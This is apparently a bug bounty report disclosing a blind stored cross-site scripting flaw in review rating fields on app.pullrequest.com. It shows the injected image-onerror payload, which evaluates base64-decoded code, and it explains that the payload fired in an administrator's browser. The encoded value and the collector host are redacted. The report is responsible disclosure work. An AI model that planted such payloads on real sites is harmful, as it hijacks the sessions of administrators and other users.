## Original Report

**Summary:**
Hi,

While researching PullRequest yesterday, I saw some "review" endpoints in web archive of "app.pullrequest.com". (http://web.archive.org/cdx/search/cdx?url=app.pullrequest.com/*&output=text&fl=original&collapse=urlkey)

One of them was https://app.pullrequest.com/reviews/ratings/6eaa6b75-b958-4530-ba46-0d00cbe74e0b/false , I went to that endpoint and filled the all fields with my blind XSS payload.
`'"><img src=x id=█████ onerror=eval(atob(this.id))>`

This payload sends an alert to my blind XSS application in `██████`

Today (May 3, 2022, 6:09 pm UTC+3), I got a lot of alerts from https://app.pullrequest.com/███. I checked the report and I see it came from an PullRequest admin who checks reviews. 

Here is a screenshot from the report :

███████

I checked the HTML source code and I see my payload reflected to `Disliked_reviewers`,  `Liked_reviewers` and `Reasons` fields without any encoding. 

You can also check the source code : █████████
